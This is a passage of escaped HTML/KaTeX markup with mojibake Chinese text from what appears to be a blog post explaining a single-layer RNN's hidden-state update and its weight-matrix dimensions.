style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;å’Œä¸Šä¸€æ—¶åˆ»&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;t-1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69841em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;çš„éšå±‚çŠ¶æ€&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h_{t-1}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.902771em;vertical-align:-0.208331em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.301108em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.208331em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ç»è¿‡ä¸€ä¸ªçº¿æ€§å±‚&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;@&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;@&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t@w_{xh}+h_{t-1}@w_{hh}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.902771em;vertical-align:-0.208331em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.301108em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.208331em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;å¤„ç†å¾—åˆ°ä¸‹ä¸€ä¸ªæ—¶åˆ»çš„éšå±‚çŠ¶æ€&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œè¿™ç§å•å±‚çš„RNNçš„å‚æ•°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;8&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554588063.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;è¾“å…¥&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;çš„ç»´åº¦ä¸ºäºŒç»´&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[batch, feature\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œbatchå’Œè¯å‘é‡ç»´åº¦feature lenï¼Œä¸ä¸€ä¸ªæƒé‡çŸ©é˜µ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{xh}^T&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1244389999999997em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8413309999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;åšçŸ©é˜µè¿ç®—ï¼Œæƒé‡çŸ©é˜µ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{xh}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;çš„ç»´åº¦ä¸ºäºŒç»´&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[hidden\space len, featrue\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt;Â &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œhidden lenè¡¨ç¤ºéšå±‚å‘é‡çš„ç»´åº¦ï¼ŒçŸ©é˜µè¿ç®—å®Œçš„ç»´åº¦ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;Â &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;[batch, hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; 